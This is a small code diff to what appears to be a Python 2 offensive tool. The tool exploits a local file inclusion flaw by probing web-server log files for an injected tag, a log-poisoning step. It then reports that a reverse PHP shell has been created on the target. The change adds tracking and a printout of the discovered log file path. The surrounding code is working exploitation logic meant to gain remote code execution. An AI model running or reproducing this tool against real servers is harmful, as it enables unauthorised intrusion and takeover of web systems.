@@ -295,6 +295,7 @@ def controll_log(args):
       LOG_FILES.append(args.logfile)
     found=False
     i=0
+    file_founded=""
     for file in LOG_FILES:
       i+=1
       sys.stdout.write( "\r% 4d / % 4d" % (i, len(LOG_FILES)))
@@ -305,17 +306,21 @@ def controll_log(args):
         req= requests.get(LFI_PATH % file, verify=False,headers={'Connection':'close'},timeout=10)
       except requests.exceptions.ReadTimeout:
         found=True
+        file_founded=file
         continue
       except requests.exceptions.ConnectionError:
         found=True
+        file_founded=file
         continue  
       debug("Response code: "+str(req.status_code),VERBOSE)
       debug("Response content: "+req.content,VERBOSE)
       d=req.content
       if d.find(TAG) != -1:
         found=True
+        file_founded=file
         break
     if found:
+      print colored("\n\nThe web server log file path is %s" % file_founded,'yellow')
       if args.ptype == 3:
         print colored("\nGot it! Reverse php Shell created in %s" % revshell_name,'green')
         url =LFI_PATH%revshell_name
